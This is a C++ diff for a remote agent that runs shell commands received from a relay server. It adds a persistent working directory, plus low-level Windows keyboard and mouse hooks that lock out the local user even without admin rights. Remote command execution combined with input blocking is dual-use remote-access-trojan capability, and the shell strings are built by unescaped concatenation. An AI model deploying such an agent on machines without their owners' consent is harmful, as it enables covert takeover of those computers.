@@ -9,6 +9,8 @@
 #include <thread>
 #include <future>
 #include <chrono>
+#include <filesystem>
+#include <atomic>
 
 // Кросс-платформенные заголовки
 #ifdef _WIN32
@@ -20,6 +22,54 @@
     #pragma comment(lib, "ws2_32.lib")
     
     typedef int socklen_t;
+    
+    // Глобальные хук‑переменные для блокировки ввода
+    static HHOOK g_kbHook = nullptr;
+    static HHOOK g_msHook = nullptr;
+    static std::thread g_hookThread;
+    static std::atomic<bool> g_hookRunning{false};
+    static DWORD g_hookThreadId = 0;
+    
+    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+        if (nCode >= 0) {
+            return 1; // блокируем
+        }
+        return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
+    }
+    
+    LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
+        if (nCode >= 0) {
+            return 1; // блокируем
+        }
+        return CallNextHookEx(g_msHook, nCode, wParam, lParam);
+    }
+    
+    void startHooks() {
+        if (g_hookRunning.load()) return;
+        g_hookRunning.store(true);
+        g_hookThread = std::thread([]() {
+            g_hookThreadId = GetCurrentThreadId();
+            HINSTANCE hInst = GetModuleHandle(nullptr);
+            g_kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInst, 0);
+            g_msHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, hInst, 0);
+            
+            MSG msg;
+            while (GetMessage(&msg, nullptr, 0, 0) > 0) {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+            }
+            
+            if (g_kbHook) { UnhookWindowsHookEx(g_kbHook); g_kbHook = nullptr; }
+            if (g_msHook) { UnhookWindowsHookEx(g_msHook); g_msHook = nullptr; }
+            g_hookRunning.store(false);
+        });
+    }
+    
+    void stopHooks() {
+        if (!g_hookRunning.load()) return;
+        PostThreadMessage(g_hookThreadId, WM_QUIT, 0, 0);
+        if (g_hookThread.joinable()) g_hookThread.join();
+    }
     
     // Undef ERROR если определён (конфликт с нашим enum)
     #ifdef ERROR
@@ -54,6 +104,12 @@ RemoteAgent::RemoteAgent(const std::string& relay_host, uint16_t relay_port,
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
 #endif
+    try {
+        auto cwd = std::filesystem::current_path();
+        m_cwd = cwd.u8string();
+    } catch (...) {
+        m_cwd = ".";
+    }
 }
 
 RemoteAgent::~RemoteAgent() {
@@ -301,13 +357,41 @@ void RemoteAgent::handleCommands() {
 }
 
 std::string RemoteAgent::executeCommand(const std::string& command) {
+    // Обработка встроенной команды cd для сохранения текущей директории
+    std::string trimmed = command;
+    while (!trimmed.empty() && (trimmed.front() == ' ' || trimmed.front() == '\t')) trimmed.erase(trimmed.begin());
+    if (trimmed.rfind("cd ", 0) == 0 || trimmed == "cd") {
+        std::string path = trimmed.size() > 2 ? trimmed.substr(3) : "";
+        while (!path.empty() && (path.front() == ' ' || path.front() == '\t')) path.erase(path.begin());
+        if (path.empty()) {
+            // cd без аргумента — оставляем как есть
+            return "0\n" + m_cwd;
+        } else {
+            try {
+                std::filesystem::path newp(path);
+                if (newp.is_relative()) {
+                    newp = std::filesystem::path(m_cwd) / newp;
+                }
+                newp = std::filesystem::weakly_canonical(newp);
+                if (std::filesystem::exists(newp) && std::filesystem::is_directory(newp)) {
+                    m_cwd = newp.u8string();
+                    return "0\n" + m_cwd;
+                } else {
+                    return "1\nNo such directory";
+                }
+            } catch (const std::exception& ex) {
+                return std::string("1\n") + ex.what();
+            }
+        }
+    }
+    
     std::array<char, 4096> buffer;
     std::string output;
     int exit_code = 0;
     
 #ifdef _WIN32
-    // На Windows: используем cmd /c с перенаправлением stderr
-    std::string safe_command = "cmd /c \"" + command + "\" 2>&1";
+    // Windows: cmd + UTF-8, сохраняем cwd через cd /d
+    std::string safe_command = "cmd /c \"chcp 65001 > nul && cd /d \"" + m_cwd + "\" && " + command + "\" 2>&1";
     
     FILE* pipe = _popen(safe_command.c_str(), "r");
     if (!pipe) {
@@ -320,8 +404,8 @@ std::string RemoteAgent::executeCommand(const std::string& command) {
     
     exit_code = _pclose(pipe);
 #else
-    // На Unix: используем timeout если доступен
-    std::string safe_command = "sh -c '" + command + "' 2>&1";
+    // Unix: сохраняем cwd через cd && cmd
+    std::string safe_command = "cd '" + m_cwd + "' && sh -c '" + command + "' 2>&1";
     
     FILE* pipe = popen(safe_command.c_str(), "r");
     if (!pipe) {
@@ -385,14 +469,12 @@ bool RemoteAgent::sendPacket(uint8_t msg_type, const std::string& payload) {
 
 bool RemoteAgent::lockInput() {
 #ifdef _WIN32
-    // Windows: пытаемся заблокировать ввод через BlockInput (требуются права администратора)
-    BOOL ok = BlockInput(TRUE);
+    // Windows: низкоуровневые хуки + BlockInput как fallback
+    startHooks();
+    BOOL ok = BlockInput(TRUE); // может вернуть FALSE без прав, но хуки продолжают блокировать
     m_input_locked = true;
-    if (ok) {
-        std::cout << "[AGENT] Input locked (Windows BlockInput)" << std::endl;
-    } else {
-        std::cout << "[AGENT] BlockInput failed (need admin?), state flagged locked anyway" << std::endl;
-    }
+    std::cout << "[AGENT] Input lock enabled (hooks"
+              << (ok ? " + BlockInput" : " (BlockInput failed)") << ")" << std::endl;
     return true;
 #elif defined(__APPLE__)
     // macOS: используем системные события для блокировки
@@ -446,7 +528,8 @@ bool RemoteAgent::lockInput() {
 
 bool RemoteAgent::unlockInput() {
 #ifdef _WIN32
-    BlockInput(FALSE); // Пытаемся снять блокировку, даже если возвращает ошибку
+    stopHooks();
+    BlockInput(FALSE); // попытка снять системную блокировку
     m_input_locked = false;
     std::cout << "[AGENT] Input unlocked (Windows)" << std::endl;
     return true;
